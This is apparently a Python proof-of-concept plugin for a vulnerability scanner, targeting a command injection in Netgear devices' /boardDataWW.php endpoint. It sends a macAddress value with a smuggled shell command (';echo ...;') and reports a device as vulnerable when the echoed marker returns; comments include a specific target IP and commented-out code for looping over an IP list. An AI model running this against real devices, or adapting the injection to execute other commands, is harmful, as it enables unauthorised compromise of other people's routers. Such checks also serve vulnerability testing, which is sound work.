#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: netgear_poc
'''
import requests
import time
'''
插件编写主方法为poc(url)
其它方法只能在主方法中调用
return True 表示存在漏洞，结果中会记录漏洞地址
return False 表示不存在漏洞，这是唯一表示不存在漏洞的方式
return str 表示存在漏洞，返回自定的str
'''

def poc(url):
	'''
	POST /boardDataWW.php HTTP/1.1
	Host: 173.62.18.112:8008
	User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
	Connection: Keep-Alive
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 75
	macAddress=536cf3a78283%3becho%20AxvnejpwHOWh%3b&reginfo=1&writeData=Submit
	'''
	#print requests.get('http://icanhazip.com/').text

	# for ip in open('ip.txt','r+').readlines():
	# 	ip=ip.replace('\n','').replace(' ','')
	# 	time.sleep(1)
	url = url.replace('\n', '').replace(' ', '')
	headers = {
		'Host':url,
		'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
		'Connection': 'Keep-Alive',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Content-Length': '75'
	}
	data={
		'macAddress':'536cf3a78283;echo AxvnejpwHOWh;',
		'reginfo':'1',
		'writeData':'Submit'
	}
	#http://173.62.18.112:8008/boardDataWW.php
	try:
		host = 'http://' + url + '/boardDataWW.php'
		req=requests.post(url= host,headers=headers,verify=False,data=data,timeout=8)
		if req.status_code == 200 and 'Invalid Data' in req.content and 'echo AxvnejpwHOWh' in req.content and 'for="reginfo"' in req.content:
			return True
		else:
			return False
	except:
		return False


		

